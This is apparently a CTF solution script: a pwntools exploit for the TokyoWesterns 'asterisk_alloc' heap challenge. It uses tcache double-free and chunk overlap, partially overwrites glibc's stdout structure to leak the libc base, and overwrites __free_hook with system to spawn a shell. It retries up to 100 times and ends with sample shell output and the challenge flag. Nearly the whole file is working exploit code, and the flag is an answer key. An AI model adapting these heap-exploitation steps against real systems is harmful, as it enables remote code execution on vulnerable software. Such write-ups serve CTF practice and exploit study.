# Coding: utf-8
from pwn import *

def menu(n):
	io.recvuntil("Your choice: ")
	io.sendline(str(n))

def malloc(sz, s):
	menu(1)
	io.recvuntil("Size: ")
	io.sendline(str(sz))
	io.recvuntil("Data: ")
	io.send(s)

def calloc(sz, s):
	menu(2)
	io.recvuntil("Size: ")
	io.sendline(str(sz))
	io.recvuntil("Data: ")
	io.send(s)

def realloc(sz, s=""):
	menu(3)
	io.recvuntil("Size: ")
	io.sendline(str(sz))
	io.recvuntil("Data: ")
	io.send(s)

def free(c):
	menu(4)
	io.recvuntil("Which: ")
	io.sendline(c)

def salir():
	menu(5)

def attach(addr):
	gdb.attach(io, 'b *{:#x}\nc'.format(addr + io.libs()[binary.path]))

binary = ELF("./asterisk_alloc", checksec=False)
# libc = ELF("./asterisk_alloc-libc-2.27.so", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)
env = {"LD_PRELOAD" : libc.path}
local = True
fail = 0
success = 0
attempt = 0
while attempt < 100:
	while True:
		attempt = attempt + 1
		io = process(binary.path, env=env) if local else remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
		# attach(0xBFB)
		offset_libc_base = 0x7000 # offset 16 bit libc base

		print "[+] Make chunks overlapping" 
		realloc(0x28, p64(0)*3 + p64(0x41))
		calloc(0x428, p64(0)*3 + p64(0x21) + p64(0) + p64(0x21))
		malloc(0x28, "A")
		free("r")
		free("r")
		realloc(0x28, "\x80")
		realloc(-1)  # ptr_r = NULL
		realloc(0x28, "A")
		realloc(-1)
		realloc(0x28, p64(0) + p64(0x31))
		free("c")
		free("c")

		print "[+] Create unsorted chunk"
		realloc(0x38, p64(0) + p64(0x431))
		free("c")

		print "[+] Overwrite stdout and leak libc base"
		realloc(0x38, p64(0) + p64(0x431) + p16((offset_libc_base + 0xc760) & 0xffff)) # offset 16 bit _IO_2_1_stdout_, overwrite 16 byte of field fd	
		realloc(-1)
		realloc(0x28, "/bin/sh\0")
		realloc(-1)
		try:
			realloc(0x28, p64(0xfbad2887 | 0x1000) + p64(0)*3 + p8(0x60 + 0x28)) # offset 8 bit _IO_2_1_stdout_ + 0x20
		except:
			fail = fail + 1
			io.close()
			print "Error"
			continue

		libc.address = u64(io.recv(8).ljust(8, '\0')) - 0x3ec7e3 # offset _IO_2_1_stdout_
		free_hook = libc.symbols['__free_hook']
		system = libc.symbols['system']
		print "[+] base_libc: 0x%08x" % libc.address
		print "[+] __free_hook: 0x%08x" % free_hook
		print "[+] system: 0x%08x" % system
		
		print "[+] overwrite __free_hook"
		try:
			realloc(-1)
		except:
			fail = fail + 1
			io.close()
			print "Error"
			continue
		free("m")
		realloc(0x28, "A")
		free("r")
		free("r")
		try:
			realloc(0x28, p64(free_hook))
		except:
			io.close()
			print "Error"
			continue

		realloc(-1)
		realloc(0x28, "A")
		realloc(-1)
		try:
			realloc(0x28, p64(system))
			break
		except:
			fail = fail + 1
			io.close()
			print "Error"
			continue

	success = success + 1
	print "[+] Launch shell"
	free("c")
	io.sendline("id")
	print io.recvline()
	io.close()

print "[+] Success_rate: %.2f%%" % ((float(success) / float(attempt)) * 100)
print "[+] Failure_rate: %.2f%%" % ((float(fail) / float(attempt)) * 100)

'''
$ id
uid=40634 gid=40000(asterisk) groups=40000(asterisk)
$ ls
asterisk_alloc
flag
$ cat flag
TWCTF{malloc_&_realloc_&_calloc_with_tcache}
'''
